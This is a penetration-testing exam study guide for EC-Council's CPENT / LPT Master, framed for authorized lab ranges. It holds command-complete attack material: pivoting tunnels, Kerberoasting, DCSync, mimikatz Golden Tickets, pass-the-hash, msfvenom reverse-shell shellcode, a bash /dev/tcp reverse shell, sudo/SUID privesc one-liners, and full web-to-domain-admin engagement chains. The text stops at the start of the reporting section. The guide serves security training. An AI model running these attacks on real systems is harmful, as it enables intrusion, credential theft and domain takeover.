---
title:       "CPENT v2 (AI) / LPT Master Exam"
summary:     "Certified Penetration Testing Professional (EC-Council) - CPENT v2 (AI) / LPT Master"
category:    "EC-COUNCIL"
tags:        [ec-council]
updated:     2026-07-28
---

{% raw %}

## CPENT v2 / LPT Master Field Guide (Complete Edition) — Certified Penetration Testing Professional (EC-Council)

The large, command-complete reference for **CPENT v2 (AI) / LPT Master**, organized around the five ranges — **Active Directory, Binary, IoT, Web, CTF** — with a deep **Pivoting & Double-Pivot** core, expanded AD attacks, proxychains/reliability guidance, and a **full worked engagement chain**. Field-tested pivoting & AD notes are folded in.

> **Exam reality:** a long, hands-on, multi-target engagement across five segmented ranges; **LPT Master** requires deep compromise + a **professional report**. Graded on methodology, **pivoting into segmented internal networks**, chaining across ranges, and documentation. Screenshot and note every step. ⚠️ **Authorized/lab use only.** All commands target the CPENT ranges / lab you're authorized to test. **IPs below are placeholder examples** — substitute your range's addressing.

**Example lab topology (placeholders used throughout):**

```
ATTACKER (you)        10.10.14.2
PIVOT-1 (dual-homed)  eth0 10.10.10.10    eth1 172.16.20.10     # first foothold (web DMZ host)
INTERNAL  (tier-2)    172.16.20.0/24      TARGET1 172.16.20.20  DC 172.16.20.5  WP 172.16.20.24
PIVOT-2 (dual-homed)  172.16.20.20        172.16.30.20          # inside tier-2
DEEP (tier-3)         172.16.30.0/24      TARGET2 172.16.30.30  (reachable only via PIVOT-2)
```

---

## Table of Contents

1. CPENT / LPT Master Overview & the Five Ranges
2. Methodology & the Engagement Loop
3. Recon, Scanning & Enumeration
4. Pivoting & Tunneling — Overview & Comparison
5. SSH Port Forwarding (Local, Remote, Dynamic)
6. Port Forwarding — Datapipe, Socat, netsh portproxy
7. Meterpreter Pivoting (autoroute, portfwd, SOCKS)
8. Chisel (Local, Remote, SOCKS)
9. Double Pivot
10. Proxychains Setup & Pivot Reliability
11. Active Directory Range — Concepts
12. AD Internals (NTDS, AD DS, Partitions)
13. AD Recon (ADRecon & friends)
14. AD Attacks (Kerberos, Delegation, Lateral Movement, DCSync)
15. AD Persistence (Golden/Silver Ticket, mimikatz)
16. Binary Exploitation Range
17. IoT Range
18. Web Range
19. CTF Range
20. Privilege Escalation (Windows & Linux)
21. Worked Engagement — Full Chain (web → double pivot → DC)
22. Worked Engagement #2 — Exposed service → Linux privesc → SSH pivot
23. Common Pitfalls & Time Management
24. Reporting (the deliverable)
25. Tooling Quick Reference & Glossary

---

## 1. CPENT / LPT Master Overview & the Five Ranges

| Range | What it tests | Signature challenge |
|---|---|---|
| **Active Directory** | Domain enum, Kerberos, lateral movement, DC compromise | Reaching the DC through pivots |
| **Binary** | Binary analysis + exploit dev (stack overflow, shellcode, ROP) | Bad-char/offset work under time |
| **IoT** | Device/firmware analysis, exposed services, protocol abuse | Firmware extraction + default creds |
| **Web** | Web exploitation → foothold → **internal pivot** | Web host is the DMZ door inward |
| **CTF** | Everything, chained | Time management across segments |

**LPT Master** = a high score across the ranges under time pressure, with a clean report. The defining difficulty is **network segmentation**: targets sit behind **pivots and double pivots**, so tunneling mastery (§4–10) is the single biggest score multiplier. The web/IoT hosts are typically **dual-homed** into the AD range — the intended path is *exploit the edge → pivot → own the domain*.

---

## 2. Methodology & the Engagement Loop

**Per target/segment:** recon → enumerate → exploit → **loot creds** → **discover the next segment** (`ip a` / `arp -a` / `route`) → **pivot/route** → repeat → document.

**Notes template (per host):**

```
HOST 172.16.20.20
Interfaces : eth0 172.16.20.20  (+ eth1 172.16.30.20 -> reaches 172.16.30.0/24)
Services   : 445 SMB (Win2008), 80 HTTP
Findings   : MS17-010 vulnerable
Access     : SYSTEM via EternalBlue over the pivot
Creds      : admin:Passw0rd!  /  NTLM aad3b...:31d6c...
Pivot      : dual-homed -> next tier 172.16.30.0/24
Evidence   : screenshots/172.16.20.20-*.png
```

**Golden rules:** (1) you can't re-pop a box after the clock stops — evidence **as you go**; (2) keep a **live network map** of "host → which segments it reaches"; (3) the moment you land on a host, **enumerate its NICs** — a second interface is the door to the next range.

---

## 3. Recon, Scanning & Enumeration

```bash
# host discovery -> full-port -> targeted (placeholder IPs)
nmap -sn 10.10.10.0/24 -oN hosts.txt
nmap -p- --min-rate 2000 -T4 10.10.10.10 -oN allports.txt
nmap -sC -sV -p 80,135,139,445,3389 10.10.10.10 -oN services.txt
nmap --script "smb-vuln-*" -p445 10.10.10.10          # MS17-010 etc.
nmap -sU --top-ports 50 10.10.10.10                    # UDP (SNMP/DNS/TFTP)
# service enum
enum4linux-ng -A 10.10.10.10
smbmap -H 10.10.10.10 ; crackmapexec smb 10.10.10.10 -u '' -p ''
snmpwalk -v2c -c public 10.10.10.10
gobuster dir -u http://10.10.10.10 -w directory-list-2.3-medium.txt -x php,html,txt
```

**Always, on every foothold, map the second network:**

```bash
ip a; ip route; arp -a          # Linux
ipconfig /all; route print; arp -a   # Windows
cat /etc/hosts                   # internal name hints
```

---

## 4. Pivoting & Tunneling — Overview & Comparison

You compromise a **dual-homed PIVOT** that sees an internal segment you can't; route your tooling through it.

| Method | When to use | Gives you |
|---|---|---|
| **SSH**`-L/-R/-D` (§5) | SSH available on/through the pivot | Clean local/remote forwards + SOCKS |
| **Datapipe / Socat / portproxy** (§6) | Quick single-port relay; Windows built-in | One-port TCP/UDP forward |
| **Meterpreter autoroute+SOCKS** (§7) | You have a Meterpreter session | Route the whole framework + SOCKS |
| **Chisel** (§8) | No SSH; egress over HTTP(S) | Local/reverse tunnels + SOCKS |

**Concept — MSF autoroute (from the notes):** `autoroute` adds a route to the internal subnet *through* an existing Meterpreter session, so the whole framework reaches hosts you otherwise couldn't — "if the route is reachable, MSF can scan/exploit it." For non-MSF tools, add a **SOCKS proxy** and drive everything through **proxychains** (§10).

---

## 5. SSH Port Forwarding (Local, Remote, Dynamic)

The three SSH tunnel modes — the cleanest pivot when SSH is available on the PIVOT.

**Local forward**`-L` — a port **on your attacker box** tunnels *through* the SSH server to an internal target (you initiate SSH):

```bash
ssh -L 4445:172.16.20.20:445 user@10.10.10.10
#   attacker 127.0.0.1:4445  ==>  172.16.20.20:445
crackmapexec smb 127.0.0.1:4445 -u admin -p 'Passw0rd!'
ssh -L 8080:172.16.20.20:80 -L 33389:172.16.20.20:3389 user@10.10.10.10   # multiple
```

**Dynamic forward**`-D`**(SOCKS)** — one port proxying to **any** host/port the pivot reaches; pair with proxychains:

```bash
ssh -fN -D 1080 user@10.10.10.10             # background SOCKS on 127.0.0.1:1080
proxychains nmap -sT -Pn -p 445,3389,80 172.16.20.20
proxychains crackmapexec smb 172.16.20.0/24 -u admin -p 'Passw0rd!'
proxychains xfreerdp /v:172.16.20.20 /u:admin /p:'Passw0rd!'
```

**Remote forward**`-R` — a port **on the pivot** tunnels back to **you** (use when the pivot can reach you but not vice-versa — e.g. to catch an internal reverse shell):

```bash
ssh -R 4444:127.0.0.1:4444 user@10.10.10.10  # internal host -> PIVOT:4444 -> attacker:4444
ssh -R 1080 user@10.10.10.10                  # reverse SOCKS on the pivot (newer OpenSSH)
```

**Flags:** `-N` (no shell), `-f` (background), `-C` (compress), `-J user@PIVOT1` (ProxyJump for chaining, §9).

---

## 6. Port Forwarding — Datapipe, Socat, netsh portproxy

**Datapipe** — tiny single-purpose TCP forwarder (`listen_host listen_port dest_host dest_port`):

```bash
# build (raise MAXCLIENTS if needed):  gcc datapipe.c -o datapipe
./datapipe 0.0.0.0 445  172.16.20.20 445      # relay pivot :445 -> internal :445
./datapipe 0.0.0.0 135  172.16.20.20 135
./datapipe 0.0.0.0 4444 10.10.14.2   4444     # relay a reverse-shell port back to you
# then target the PIVOT's forwarded port from your box:  set RHOSTS 10.10.10.10
```

**Socat** — full forwarder (TCP **and UDP**):

```bash
socat TCP-LISTEN:80,fork TCP:172.16.20.20:80
socat UDP-RECVFROM:161,fork UDP-SENDTO:172.16.20.20:161   # SNMP
socat UDP-RECVFROM:53,fork  UDP-SENDTO:172.16.20.20:53    # DNS
```

**Windows**`netsh portproxy` — built-in (needs local admin):

```cmd
netsh interface portproxy add    v4tov4 listenport=8888 connectaddress=172.16.20.20 connectport=80
netsh interface portproxy show   v4tov4
netsh interface portproxy delete v4tov4 listenport=8888
:: reach it at  <pivot-ip>:8888  ->  172.16.20.20:80
```

**Worked use — MS17-010 over a forward:** forward the pivot's SMB ports to an internal Win2008, then aim EternalBlue at the **pivot**:

```bash
# on PIVOT:  datapipe 0.0.0.0 445 172.16.20.20 445   (and 135)
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.10        # pivot relays to 172.16.20.20
set LHOST  10.10.14.2
check ; exploit
```

---

## 7. Meterpreter Pivoting (autoroute, portfwd, SOCKS)

**Get a Meterpreter session on the PIVOT**, then route the framework through it.

```bash
msfconsole -q
use exploit/multi/ssh/sshexec            # example: creds-based foothold on the pivot
set lhost 10.10.14.2 ; set rhosts 10.10.10.10
set username administrator ; set password 'Passw0rd!'
exploit
run get_local_subnets                     # discover the internal subnet(s)
```

**Session routing (autoroute):**

```text
run post/multi/manage/autoroute           # auto-add routes for the session's subnets
run autoroute -s 172.16.20.0/24           # or explicit
run autoroute -p                          # print routing table
background
# equivalently:  route add 172.16.20.0 255.255.255.0 <session-id>
```

**SOCKS for non-MSF tools:**

```text
use auxiliary/server/socks_proxy ; set VERSION 5 ; set SRVPORT 1080 ; run
# proxychains -> socks5 127.0.0.1 1080
```

**Single-port forward:** `portfwd add -l 3389 -p 3389 -r 172.16.20.20`. **Exploit internally through the route:**

```text
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 172.16.20.20        # reachable via autoroute
set LHOST  172.16.20.10        # pivot's INTERNAL ip -> callback stays in-segment
check ; exploit
```

**LHOST over a pivot:** set it to the pivot's *internal* interface (or use a **bind** payload / a remote-forwarded port) so the internal target can reach the handler.

---

## 8. Chisel (Local, Remote, SOCKS)

Chisel tunnels over HTTP(S) — ideal when SSH isn't available. One binary, **server** or **client**.

**Local mode (server on the compromised pivot):**

```bash
# PIVOT:    chisel server -p 443
# ATTACKER: chisel client 10.10.10.10:443 4445:172.16.20.20:445     # 127.0.0.1:4445 -> target:445
# SOCKS:    PIVOT: chisel server -p 12345 ; ATTACKER: chisel client 10.10.10.10:12345 socks
```

**Remote/reverse mode (server on YOUR box — best through NAT/egress):**

```bash
# ATTACKER: chisel server -p 443 --reverse
# PIVOT:    chisel client 10.10.14.2:443 R:445:172.16.20.20:445     # attacker 127.0.0.1:445 -> target:445
# PIVOT:    chisel client 10.10.14.2:443 R:8080:172.16.20.20:80
# reverse SOCKS: ATTACKER: chisel server -p 12345 --reverse ; PIVOT: chisel client 10.10.14.2:12345 R:socks
```

Pair reverse SOCKS with proxychains exactly like §5/§7. Chisel's `R:socks` is often the most reliable "whole-network" pivot on the exam.

---

## 9. Double Pivot

Reach a **tier-3** segment (`172.16.30.0/24`) visible only from a `172.16.20.x` host — chain the tunnel again.

**Meterpreter (cleanest):**

```text
# session 1 on PIVOT-1, autoroute 172.16.20.0/24 (as §7)
# exploit PIVOT-2 (172.16.20.20) through that route -> session 2
run autoroute -s 172.16.30.0/24           # via session 2
# refresh SOCKS -> proxychains now reaches 172.16.30.0/24
proxychains nmap -sT -Pn 172.16.30.30
```

**Chisel:** run a second reverse-SOCKS from PIVOT-2 back **through** the first tunnel (chain proxychains configs) so egress is PIVOT-1 → PIVOT-2 → tier-3. **SSH:** `ssh -J user@PIVOT1 user@PIVOT2` then `-D 1081` from PIVOT-2 (second SOCKS), or nest `-L` forwards.

**Reflex that always works:** foothold → find next NIC/subnet → route/SOCKS through this hop → enumerate the new segment → compromise a dual-homed host in it → repeat. Maintain the "host → segments" map.

---

## 10. Proxychains Setup & Pivot Reliability

**Config (**`/etc/proxychains4.conf`**):**

```text
# use ONE mode:
strict_chain          # go through every proxy in order (default; good for a single hop)
# dynamic_chain       # skip dead proxies (useful when chaining multiple)
proxy_dns             # resolve names through the proxy (avoid DNS leaks)
[ProxyList]
socks5 127.0.0.1 1080         # your ssh -D / meterpreter / chisel SOCKS
# double pivot -> add the second SOCKS below the first (dynamic_chain):
# socks5 127.0.0.1 1081
```

**Reliability tips (where exam time is lost):**

- **Use**`-sT -Pn`**with nmap over proxychains** — SYN scans and host-discovery don't traverse SOCKS; full-connect + skip-ping is mandatory.
- **Prefer reverse SOCKS** (chisel `R:socks`, meterpreter `socks_proxy`) through NAT/egress-filtered ranges.
- **Keep callbacks in-segment:** set `LHOST` to the pivot's internal NIC, or catch shells via a **remote forward** (§5) — a reverse shell to your external IP won't route from a deep segment.
- **One tool per SOCKS hop** can be slow — for AD, run `bloodhound-python`/`secretsdump` directly over the SOCKS rather than proxychaining a GUI.
- **Test the tunnel** with a known port first: `proxychains curl -s http://172.16.20.20` before launching big scans.

---

## 11. Active Directory Range — Concepts

**Trees & Forests:**

- **Tree** — domains sharing a contiguous namespace (`red.com`, `sub.red.com`): naming continuity only; **each domain is administratively independent** — a tree does *not* imply cross-domain control.
- **Forest** — one or more trees joined (`red.com` + `sub.red.com` + `blue.com`); the forest is the top security boundary.

**Permission vs Privilege (Right):**

- **Permission** — access control over **objects** (files, registry).
- **Privilege / Right** — control over the **OS** (what a token may do); the **State** column in `whoami /priv`.
- "Maximum power" = **Full Control over every object AND every OS right**.

**Group hierarchy (the AD attack is climbing this):**

```
Administrators     (local, incl. on the DC)
  - most powerful group on THAT machine; on the DC it runs the DC.
Domain Admins      (domain)
  - most powerful in the DOMAIN; when a machine joins the domain, Domain Admins
    are ADDED to that machine's local Administrators
    (net localgroup administrators) -> DA is admin on every domain member.
Enterprise Admins  (forest)
  - highest logical authority; a member of EVERY domain's DC Administrators;
    exists ONLY in the forest-root domain.
```

**Mental model:** the **DC's local Administrator** is the "secretary-general" — decides much *inside* the DC, powerless outside; **Domain Admin** is the "president" — power across the domain. But whoever controls `DC\Administrator` can set **Group Policy** and thus control Domain Admins ⇒ **DC compromise = domain compromise**.

**Group Policy note:** the **Group Policy Client** service applies GPOs; a policy applied while the service runs is written to the machine, and disabling the service later does **not** undo an already-applied policy.

---

## 12. AD Internals (NTDS, AD DS, Partitions)

**NTDS.dit** — the AD database on the DC; delete it and AD is gone. Split into **partitions**:

```
Schema         - defines the entire AD data structure (forest-wide)
Configuration  - forest-wide settings (excluding domain data)
<Domain>       - all settings/objects for a domain   (one partition per domain)
```

Inspect with **ADSI Edit**; browse objects with **AD Users and Computers**. **Credential storage:** pre-DC, local accounts live in the **SAM**; post-promotion, domain creds live in **NTDS.dit** — the **local SAM still exists**.

**AD DS services & ports:**

```
DNS 53           - locating DCs (SRV records)
Kerberos 88      - authentication (TGT/TGS)
LDAP 389 / 636   - directory access (LDAPS)
Global Catalog 3268 / 3269 - forest-wide search
SMB 445 / RPC 135 - auth, admin, DCSync
```

---

## 13. AD Recon (ADRecon & friends)

**ADRecon** — even a low-priv domain user can pull a full domain picture.

```powershell
powershell.exe -nop -ep bypass
#  -nop = -NoProfile ; -ep bypass = -ExecutionPolicy Bypass (run unsigned scripts)
.\ADRecon.ps1 -OutputType HTML                       # in-domain -> Domain/Groups/Users .html
.\ADRecon.ps1 -DomainController 172.16.20.5 -OutputType HTML -Credential lab.com\user   # with a cred
.\ADRecon.ps1 -DomainController 172.16.20.5 -OutputType ALL  -Credential lab.com\user
```

**Complementary recon (over the SOCKS pivot):**

```bash
proxychains crackmapexec smb 172.16.20.0/24 -u user -p 'Passw0rd!'
proxychains crackmapexec smb 172.16.20.5 -u user -p pass --users --groups --pass-pol
proxychains ldapdomaindump -u 'lab\user' -p 'Passw0rd!' 172.16.20.5
proxychains bloodhound-python -u user -p 'Passw0rd!' -d lab.com -c all -ns 172.16.20.5
# Windows: . .\PowerView.ps1 ; Get-NetUser ; Get-NetGroup "Domain Admins" ; Find-LocalAdminAccess
```

**Hunt for:** Domain Admins, Kerberoastable SPNs, AS-REP-roastable users, delegation flags, and where your user is local admin (lateral paths). BloodHound's shortest-path-to-DA is the fastest planner.

---

## 14. AD Attacks (Kerberos, Delegation, Lateral Movement, DCSync)

**Kerberoasting** (crack service-account passwords):

```bash
proxychains GetUserSPNs.py lab.com/user:'Passw0rd!' -dc-ip 172.16.20.5 -request
hashcat -m 13100 tgs.hash rockyou.txt
```

**AS-REP roasting** (pre-auth disabled):

```bash
proxychains GetNPUsers.py lab.com/ -usersfile users.txt -no-pass -dc-ip 172.16.20.5
hashcat -m 18200 asrep.hash rockyou.txt
```

**Delegation abuse (concepts):**

- **Unconstrained delegation:** a host that can impersonate any user who authenticates to it — coerce a DC to auth (`printerbug`/`PetitPotam`) then capture its TGT.
- **Constrained / RBCD (resource-based constrained delegation):** if you can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer, impersonate a privileged user to it (`getST.py -impersonate administrator`). **Lateral movement (Pass-the-Hash / creds):**

```bash
proxychains crackmapexec smb 172.16.20.20 -u administrator -H <NTLM>
proxychains psexec.py -hashes :<NTLM> administrator@172.16.20.20
proxychains wmiexec.py lab/administrator@172.16.20.20 -hashes :<NTLM>
proxychains evil-winrm -i 172.16.20.20 -u administrator -H <NTLM>
```

**Dump domain creds (DCSync, needs replication rights / DA / on the DC):**

```bash
proxychains secretsdump.py lab.com/administrator@172.16.20.5 -just-dc
proxychains secretsdump.py -just-dc-user krbtgt lab.com/administrator@172.16.20.5   # krbtgt for Golden Ticket
```

**Flow:** recon (BloodHound) → roast/relay/PtH/delegation → reach a Domain Admin or the DC → **DCSync** → domain owned.

---

## 15. AD Persistence (Golden/Silver Ticket, mimikatz)

*(as authorized; document clearly)*

```text
# mimikatz on a compromised Windows host
privilege::debug
sekurlsa::logonpasswords          # dump plaintext/NTLM/Kerberos from LSASS
lsadump::sam                       # local SAM hashes
lsadump::dcsync /user:krbtgt       # DCSync the krbtgt hash (needs rights)
# Golden Ticket (forge a TGT as any user, incl. non-existent) — needs krbtgt hash + domain SID
kerberos::golden /user:Administrator /domain:lab.com /sid:<domain-SID> /krbtgt:<krbtgt-NTLM> /ptt
# Silver Ticket (forge a service ticket to ONE service) — needs the service account hash
kerberos::golden /user:Administrator /domain:lab.com /sid:<SID> /target:host.lab.com /service:cifs /rc4:<svc-NTLM> /ptt
```

**Impacket equivalents:** `ticketer.py` (forge), `getST.py` (request), `psexec.py`/`wmiexec.py` (use). **Detection/harden note (report side):** rotate `krbtgt` twice to invalidate Golden Tickets; monitor abnormal TGT lifetimes and DCSync from non-DCs.

---

## 16. Binary Exploitation Range

Stack buffer overflow vs a lab-vulnerable service (x86/x64) + basic exploit dev. **Methodology (OSED/eCPPT-style):**

```bash
# 1) fuzz to crash -> 2) offset
msf-pattern_create -l 2000                 # send, read the fault
msf-pattern_offset -l 2000 -q <EIP>        # -> offset
# 3) confirm: "A"*offset + "BBBB" -> EIP=42424242
# 4) bad chars: send \x01..\xff, diff memory in the debugger, drop mangling bytes (\x00 usually bad)
# 5) JMP ESP:  !mona modules ; !mona find -s "\xff\xe4" -m <no-ASLR/DEP module>
# 6) shellcode (exclude bad chars)
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 -f python -b "\x00\x0a\x0d" EXITFUNC=thread -v sc
```

```python
payload = b"A"*offset + p32(jmp_esp) + b"\x90"*16 + sc   # little-endian, NOP sled
# send; catch:  nc -lvnp 443
```

**64-bit / NX on → ROP:** find gadgets (`ROPgadget --binary ./bin`, `ropper`), build with pwntools `ROP`, `ret2libc`/`ret2syscall` (same shape as the eCPPT/LEE material). Linux reverse-shell one-liner if you land a shell: `bash -i >& /dev/tcp/10.10.14.2/443 0>&1`.

---

## 17. IoT Range

Treat the device as a small networked computer + firmware.

```bash
# discover & fingerprint (common IoT ports)
nmap -sV -p- <device-ip>                   # 23 telnet, 1883 MQTT, 5683 CoAP, 502 Modbus, 554 RTSP, 1900 UPnP
# firmware analysis
binwalk -e firmware.bin                    # extract filesystem
find _firmware.bin.extracted -name "*.conf" -o -name "shadow" -o -name "passwd"
grep -rIn 'password\|admin\|api_key\|token' squashfs-root/ 2>/dev/null
strings firmware.bin | grep -i 'passwd\|telnet\|http\|key'
# emulate a binary from the firmware (optional):
qemu-arm -L squashfs-root ./squashfs-root/usr/bin/<binary>
```

**Common wins:** default/weak creds (telnet/HTTP admin), hardcoded secrets in firmware, unauthenticated web/command-injection in the device UI, exposed UART/JTAG debug. Then pivot from the device into the network like any other host.

---

## 18. Web Range

Web is usually the **entry point** to an internal segment — exploit → shell → pivot (§4–10).

```bash
whatweb http://<web-ip>; gobuster dir -u http://<web-ip> -w directory-list-2.3-medium.txt -x php,txt
# WordPress (from the notes' WP host):
wpscan --url http://<web-ip> --enumerate u,p,t,vp
wpscan --url http://<web-ip> -U admin -P rockyou.txt          # brute wp-login
sqlmap -u "http://<web-ip>/page?id=1" --batch --dbs
sqlmap -u "http://<web-ip>/page?id=1" --os-shell               # if stacked/FILE priv -> RCE
```

**Web flaw → shell → pivot:** SQLi→creds/`--os-shell`; file upload→web shell; LFI/RFI→RCE; command injection; WordPress admin→theme/plugin editor→PHP RCE. Once you have a shell on the web host, check its second NIC (`ip a`) — it's dual-homed into the AD range, so pivot inward (this is the intended CPENT path).

---

## 19. CTF Range

Mixed challenges requiring you to **chain** everything: recon → exploit (web/binary/service) → loot → **pivot** → escalate → repeat across segments. What wins here is **time management** + a rock-solid tunneling setup (a reliable reverse-SOCKS and a clean, tested proxychains config). Keep the reflex: *see a dual-homed host → map its subnets → route through it → move on.*

---

## 20. Privilege Escalation (Windows & Linux)

You'll land as a low-priv user on most footholds — escalate before looting/pivoting.

**Linux:**

```bash
id; sudo -l; uname -a; cat /etc/os-release          # who am I, sudo rights, kernel
find / -perm -4000 -type f 2>/dev/null              # SUID binaries
getcap -r / 2>/dev/null                             # capabilities (cap_setuid etc.)
cat /etc/crontab; ls -la /etc/cron.*                # writable cron jobs
ss -tulpen                                          # local-only services (pivot/privesc hints)
grep -rIl 'password' /var/www /home /opt 2>/dev/null
./linpeas.sh -a
```

Common wins: **sudo GTFOBins** (`sudo -l` → e.g. `sudo find . -exec /bin/sh \;`), **SUID GTFOBins** (`/usr/bin/find . -exec /bin/sh -p \;`), **capabilities** (`python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'`), writable **cron**/PATH, creds reuse, kernel exploit (last resort).

**Windows:**

```cmd
whoami /priv & whoami /groups & systeminfo
.\winPEASx64.exe  &  powershell -ep bypass; . .\PowerUp.ps1; Invoke-AllChecks
sc qc <service> & accesschk.exe -uwcqv "Everyone" <service>
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Common wins: **SeImpersonatePrivilege** (service accounts) → PrintSpoofer/Potato → SYSTEM (`PrintSpoofer.exe -i -c cmd`); **unquoted service path** with a writable dir; **weak service perms** (reconfigure `binPath`); **AlwaysInstallElevated** (malicious MSI); stored creds (`cmdkey /list`, unattend.xml, registry AutoLogon). On domain members, SYSTEM/local-admin lets you dump creds (mimikatz/hashdump) to feed lateral movement (§14).

---

## 21. Worked Engagement — Full Chain (web → double pivot → DC)

*Illustrative end-to-end run tying the ranges together. Authorized/lab only. Placeholder IPs.*

**Phase 1 — Edge recon (Web range).** From ATTACKER `10.10.14.2`, scan the DMZ host `10.10.10.10`.

```bash
nmap -p- --min-rate 2000 10.10.10.10 -oN edge.txt      # 80 HTTP, 22 SSH
whatweb http://10.10.10.10                               # WordPress
wpscan --url http://10.10.10.10 --enumerate u,vp
```

**Phase 2 — Foothold (web → shell).** Weak `wp-admin` cred → theme editor → PHP web shell → reverse shell.

```bash
wpscan --url http://10.10.10.10 -U admin -P rockyou.txt          # admin:password
# edit 404.php with a PHP reverse shell; trigger it:
curl "http://10.10.10.10/wp-content/themes/twentytwenty/404.php"  # catcher: nc -lvnp 443
id   # www-data on PIVOT-1
```

**Phase 3 — Discover the internal segment.** PIVOT-1 is dual-homed.

```bash
ip a          # eth0 10.10.10.10  ; eth1 172.16.20.10  -> reaches 172.16.20.0/24
arp -a        # neighbors: 172.16.20.5, .20, .24
```

**Phase 4 — Pivot #1 (SOCKS into tier-2).** Reverse chisel back to you, expose SOCKS.

```bash
# ATTACKER: chisel server -p 443 --reverse
# PIVOT-1 : chisel client 10.10.14.2:443 R:socks
# proxychains -> socks5 127.0.0.1 1080
proxychains nmap -sT -Pn -p 445,88,389 172.16.20.5 172.16.20.20    # DC + a Win2008
```

**Phase 5 — Internal exploit (AD range entry).** `172.16.20.20` (Win2008) is MS17-010-vulnerable; exploit it via a Meterpreter route or over the SOCKS.

```text
# meterpreter route through PIVOT-1, then:
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 172.16.20.20 ; set LHOST 172.16.20.10 ; exploit    # SYSTEM
# loot local creds:
hashdump    (or mimikatz sekurlsa::logonpasswords)
```

**Phase 6 — Domain recon.** With a domain user cred from the box, enumerate over the pivot.

```bash
proxychains bloodhound-python -u svc -p 'Passw0rd!' -d lab.com -c all -ns 172.16.20.5
proxychains GetUserSPNs.py lab.com/svc:'Passw0rd!' -dc-ip 172.16.20.5 -request   # Kerberoast
hashcat -m 13100 tgs.hash rockyou.txt                                            # -> sqlsvc:Summer2024!
```

BloodHound path: `svc` → (Kerberoastable `sqlsvc`) → group with DCSync rights.

**Phase 7 — Double pivot (tier-3).** `172.16.20.20` also has `172.16.30.20` → tier-3 `172.16.30.0/24`.

```text
# exploit 172.16.20.20 gave a session; add the deeper route:
run autoroute -s 172.16.30.0/24
# second reverse SOCKS (chisel) through PIVOT-2 for non-MSF tools
proxychains nmap -sT -Pn 172.16.30.30
```

**Phase 8 — Domain compromise (DCSync).** `sqlsvc` has replication rights → DCSync the DC.

```bash
proxychains secretsdump.py lab.com/sqlsvc:'Summer2024!'@172.16.20.5 -just-dc
# -> Administrator + krbtgt NTLM
proxychains psexec.py -hashes :<admin-NTLM> administrator@172.16.20.5   # SYSTEM on the DC
```

**Chain summary (each link a fixable finding):** `WordPress weak admin → PHP RCE (www-data)` → dual-homed pivot → **chisel SOCKS** into 172.16.20.0/24 → **MS17-010** SYSTEM on Win2008 → domain user creds → **Kerberoast** `sqlsvc` → **DCSync** → **Domain Admin**; plus a **double pivot** into 172.16.30.0/24 for the remaining targets. The **report's attack narrative** is exactly this segment-by-segment path with a network diagram; remediations (strong wp creds + disable theme editor, patch MS17-010, strong service-account password, tier the DA rights, segment the DMZ NIC) each break a link.

---

## 22. Worked Engagement #2 — Exposed service → Linux privesc → SSH pivot

*A second chain from a different entry point, using SSH forwarding + Linux privesc. Authorized/lab, placeholder IPs.*

**Phase 1 — Edge foothold (service exploit).** DMZ host `10.10.10.10` runs a vulnerable web/app service; a known exploit or SQLi `--os-shell` yields a shell as `www-data`.

```bash
sqlmap -u "http://10.10.10.10/item?id=1" --os-shell     # or a searchsploit PoC
id   # www-data
```

**Phase 2 — Linux privesc → root.** `sudo -l` shows a GTFOBins-abusable binary.

```bash
sudo -l                          # (root) NOPASSWD: /usr/bin/tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh   # -> root
cat /root/.ssh/id_rsa; cat /etc/hosts    # loot a key + internal names
ip a                             # eth1 172.16.20.10 -> internal 172.16.20.0/24
```

**Phase 3 — SSH pivot (dynamic SOCKS) into tier-2.** Use the looted key (or add yours) to open a dynamic tunnel through the pivot.

```bash
# from ATTACKER, using the pivot as the SSH server:
ssh -i loot_id_rsa -fN -D 1080 root@10.10.10.10
# proxychains -> socks5 127.0.0.1 1080
proxychains nmap -sT -Pn -p 22,445,3389 172.16.20.0/24
```

**Phase 4 — Internal target + local forward for a specific service.** A tier-2 host `172.16.20.20` exposes RDP; forward it for direct access.

```bash
ssh -i loot_id_rsa -L 33389:172.16.20.20:3389 root@10.10.10.10
xfreerdp /v:127.0.0.1:33389 /u:admin /p:'Passw0rd!'
# or over SOCKS: proxychains crackmapexec smb 172.16.20.20 -u admin -p 'Passw0rd!'
```

**Phase 5 — Double pivot (remote forward for a deep callback).** `172.16.20.20` reaches tier-3 `172.16.30.0/24` but that segment can't reach you — use a **remote forward** so a tier-3 reverse shell routes back through the chain.

```bash
# nested: from a shell on 172.16.20.20, SSH to it and remote-forward your handler inward
ssh -R 4444:127.0.0.1:4444 user@172.16.20.20     # tier-3 host -> 172.16.20.20:4444 -> attacker:4444
proxychains nmap -sT -Pn 172.16.30.30            # enumerate tier-3 over the chained SOCKS
```

**Chain summary:** service exploit → `sudo tar`**GTFOBins root** → looted SSH key → **SSH dynamic SOCKS** into tier-2 → **local forward** to RDP → **remote forward** for a tier-3 callback (double pivot). Remediations: patch the service, remove the `sudo tar` NOPASSWD, protect private keys, segment the DMZ NIC, restrict RDP.

---

## 23. Common Pitfalls & Time Management

- **Timebox each range.** If a foothold stalls, move on — partial completion across ranges still scores. Come back with fresh eyes.
- **Enumerate NICs immediately** on every shell (`ip a`/`ipconfig /all`) — missing a second interface means missing the whole next segment.
- **nmap over SOCKS needs**`-sT -Pn` (no SYN/ping through proxychains) — a "nothing's up" result over a pivot is usually this mistake.
- **Keep reverse-shell callbacks in-segment** — set `LHOST` to the pivot's internal NIC or use a remote forward; a callback to your external IP won't route from a deep segment.
- **Test tunnels with one known port** (`proxychains curl http://<host>`) before launching big scans — saves chasing phantom failures.
- **Screenshot every success as it happens** — you cannot re-pop after the clock stops, and the report is graded.
- **Maintain the live map** ("host → segments it reaches") — it makes the double pivot obvious instead of a scramble.
- **Prefer reverse SOCKS** (chisel `R:socks`, meterpreter `socks_proxy`) through egress-filtered ranges; local-mode servers may be blocked inbound.
- **Rotate tools, not just payloads** — if MS17-010 won't fire, check patch level and try creds/PtH; if MSF is flaky over the route, drop to impacket over SOCKS.

---

## 24. Reporting (the deliverable)

LPT Master requires a professional report:

```
1. Executive Summary   - business risk & posture (non-technical)
